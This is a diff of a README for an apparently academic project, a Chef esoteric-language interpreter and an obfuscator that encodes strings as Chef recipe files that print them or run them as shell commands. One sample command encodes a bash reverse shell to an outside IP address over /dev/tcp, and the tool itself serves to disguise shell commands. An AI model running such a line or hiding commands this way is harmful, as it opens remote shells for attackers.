@@ -29,7 +29,7 @@ Our final project attempts to create a Chef interpreter in C, and an obfuscator 
 
 ### To obfuscate: `./obfuscate`
 
-`Obfuscate` takes a single command flag and a string to encode and outputs a valid Chef file. The two valid flags are
+Obfuscate takes a single command flag and a string to encode and outputs a valid Chef file. The two valid flags are
 - `-p`: The Chef file will *print* the string provided.
 - `-x`: The Chef file *execute* the string provided as an `sh`-compatible shell command.
 
@@ -39,7 +39,7 @@ Sample usage:
 - `./obfuscate -x 'echo "Hello, world!"'
 - `./obfuscate -x 'bash -c 'bash -i >& /dev/tcp/149.89.150.100/9001 0>&1''
 
-Watch out! Obfuscate is ONLY guaranteed to work on ASCII input with 100 or fewer distinct characters. Attempting to use it otherwise will throw an error.
+Watch out! Obfuscate is ONLY guaranteed to work on ASCII input with 256 or fewer distinct characters.[^5] Attempting to use it otherwise will throw an error.
 
 
 
@@ -47,3 +47,4 @@ Watch out! Obfuscate is ONLY guaranteed to work on ASCII input with 100 or fewer
 [^2]: [Mateas, Michael and Nick Montfort. “A Box, Darkly: Obfuscation, Weird Languages, and Code Aesthetics.” In Proceedings of the 6th Digital Arts and Culture Conference, IT University of Copenhagen, 1-3 Dec 2005, pp. 144-153.](https://nickm.com/cis/a_box_darkly.pdf)
 [^3]: At least I assume it's Turing complete. I found [this program by Wesley Janssen, Joost Rijneveld and Mathijs Vos](https://github.com/joostrijneveld/Chef-Interpreter/blob/master/ChefInterpreter/TuringsTastyTortillas.chef) which claims to be a working Turing Machine (and it certainly seems to be) and the fact that I cannot spot any way to solve the halting problem with it certainly seem exciting, but I can find no actual analysis and do not trust my own intuition.
 [^4]: On the other hand, I know for a *fact* that Chef cannot represent all possible recipes, because there is no way to encode my grandmother's skillet chops and rice recipe. The step "Lie about the presence of onions" is unencodable due to the simple fact that Chef requres all instructions involving arbitrary verbs to be loops and have a matching "until *present participle*" command, while the command to lie about the presence of onions can never complete.
+[^5]: It shouldn't be possible to use more than 256 distinct characters while staying in the 7-bit ASCII range, but you never know.
